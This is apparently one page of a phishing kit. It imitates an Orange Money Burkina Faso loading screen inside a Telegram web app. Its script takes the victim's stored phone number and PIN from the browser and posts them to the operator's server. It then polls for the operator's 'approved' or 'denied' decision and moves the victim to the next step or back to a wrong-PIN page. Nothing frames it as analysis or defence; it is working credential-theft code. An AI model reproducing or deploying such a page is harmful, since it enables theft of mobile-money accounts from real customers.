<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Money Burkina Faso - Traitement</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --orange-primary: #f15a24;
            --orange-gradient: linear-gradient(180deg, #ff6b00 0%, #f15a24 100%);
            --bg-dark: #333333;
            --card-bg: #ffffff;
            --text-dark: #222222;
            --text-muted: #666666;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-dark);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .loading-card {
            background: var(--card-bg);
            width: 88%;
            max-width: 380px;
            padding: 45px 24px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-circle {
            width: 110px;
            height: 110px;
            background: var(--orange-gradient);
            border-radius: 50%;
            margin-bottom: 28px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 6px 18px rgba(241, 90, 36, 0.3);
        }

        .loader-circle::after {
            content: '';
            width: 82px;
            height: 82px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            color: var(--orange-primary);
            font-size: 24px;
            margin: 0 0 10px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        p {
            color: var(--text-muted);
            font-size: 15px;
            margin: 0;
            line-height: 1.5;
            font-weight: 500;
        }
    </style>
</head>

<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">Traitement...</h2>
    <p id="sub-text">Préparation de la vérification...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {
    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");

    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
    const pin = localStorage.getItem("lastPin") || "";

    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin, country: "BF" })
        });
    } catch (err) {
        console.error("❌ Erreur de requête :", err);
    }

    setTimeout(() => {
        mainText.textContent = "Veuillez patienter...";
        subText.textContent = "Cela prend quelques secondes";
    }, 3000);

    async function checkApproval() {
        if (!phone) return;

        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();

            if (data.status === "approved") {
                mainText.textContent = "Approuvé !";
                subText.textContent = "Ouverture de la page suivante...";

                setTimeout(() => {
                    window.location.href = "/page8";
                }, 1500);
            }

            if (data.status === "denied") {
                mainText.textContent = "Refusé !";
                subText.textContent = "Code PIN ou numéro incorrect.";

                setTimeout(() => {
                    window.location.href = "/page6?error=wrongpin";
                }, 2000);
            }

        } catch (err) {
            console.error("❌ Échec de la vérification du statut :", err);
        }
    }

    setInterval(checkApproval, 2000);
});
</script>

</body>
</html>
